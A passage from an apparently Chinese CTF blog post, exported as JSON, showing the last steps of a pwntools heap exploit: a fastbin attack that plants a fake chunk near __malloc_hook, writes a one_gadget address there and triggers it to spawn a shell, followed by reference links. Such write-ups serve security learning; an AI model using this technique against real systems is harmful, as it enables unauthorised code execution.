class=\"token number\">0x3c4b78</span> </pre></td></tr><tr><td data-num=\"59\"></td><td><pre></pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token comment\">#步骤 5</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>fake_chunk<span class=\"token operator\">=</span> libc_base<span class=\"token operator\">+</span><span class=\"token number\">0x3c4aed</span> </pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre><span class=\"token comment\">#步骤 6</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#回收一部分 chunk4</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#使 chunk4 进入 fastbin 中</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>payload4<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span>fake_chunk<span class=\"token punctuation\">)</span>  <span class=\"token comment\">#改写 chunk4 的 fd 使 fake_chunk 进入 fastbin</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>fill<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload4<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre></pre></td></tr><tr><td data-num=\"70\"></td><td><pre><span class=\"token comment\">#步骤 7</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#index4，分配 chunk4</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#index5，分配 fake_chunk</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre></pre></td></tr><tr><td data-num=\"74\"></td><td><pre><span class=\"token comment\">#因为 malloc_hook=main_arena-0x10，fake_chunk=mian_arena-0x33</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre><span class=\"token comment\">#所以 malloc_hook=fake_chunk+0x23 (fake_chunk+0x33-0x10)</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>payload5<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p8<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span>  <span class=\"token comment\">#0x13</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>payload5<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>libc_base<span class=\"token operator\">+</span><span class=\"token number\">0x4526a</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#0x4526a 由 one_gadget 查找得到</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>fill<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload5<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">)</span>               <span class=\"token comment\">#index6, 执行一次就会执行 malloc_hook，就可以 getshell</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://z1.ax1x.com/2023/09/14/pPW9VAI.png\" alt=\"\" /></p>\n<p>参考：<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3RoaW5rX3ljeC9hcnRpY2xlL2RldGFpbHMvNzc5ODI0Mzk=\">https://blog.csdn.net/think_ycx/article/details/77982439</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYnMua2FueHVlLmNvbS90aHJlYWQtMjIzNDYxLmh0bQ==\">https://bbs.kanxue.com/thread-223461.htm</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzg0Nzk2OS9hcnRpY2xlL2RldGFpbHMvMTA0ODk3MjQ5\">https://blog.csdn.net/weixin_43847969/article/details/104897249</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYS9hcnRpY2xlL2RldGFpbHMvMTA4MzYwMzc1\">https://blog.csdn.net/mcmuyanga/article/details/108360375</span></p>\n<p>关于堆的参数：<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzg0Nzk2OS9hcnRpY2xlL2RldGFpbHMvMTA0ODk3MjQ5\">https://blog.csdn.net/weixin_43847969/article/details/104897249</span></p>\n",
            "tags": [
                "pwn",
                "fastbin.attack"
            ]
        }
    ]
}